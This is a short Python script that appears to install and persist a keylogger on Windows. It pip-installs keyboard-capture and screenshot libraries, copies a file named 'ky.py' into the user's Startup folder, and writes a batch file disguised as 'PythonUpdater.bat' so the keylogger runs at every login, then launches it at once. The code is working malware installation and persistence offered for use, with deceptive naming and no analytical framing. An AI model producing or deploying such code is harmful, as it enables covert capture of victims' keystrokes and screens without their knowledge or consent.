import subprocess
import sys
import time
import os
import shutil
import getpass

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

packages = [
    "keyboard",
    "pyscreenshot",
    "Pillow",
]

for package in packages:
    install(package)

time.sleep(60)

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

current_dir = os.getcwd()
keylogger_script = os.path.join(current_dir, "ky.py")
keylogger_script_startup = os.path.join(startup_folder, "ky.py")
bat_script_path = os.path.join(startup_folder, "PythonUpdater.bat")

shutil.copy(keylogger_script, keylogger_script_startup)

with open(bat_script_path, 'w') as bat_file:
    bat_file.write(f'@echo off\n')
    bat_file.write(f'python "{keylogger_script_startup}"\n')

subprocess.run([sys.executable, keylogger_script])
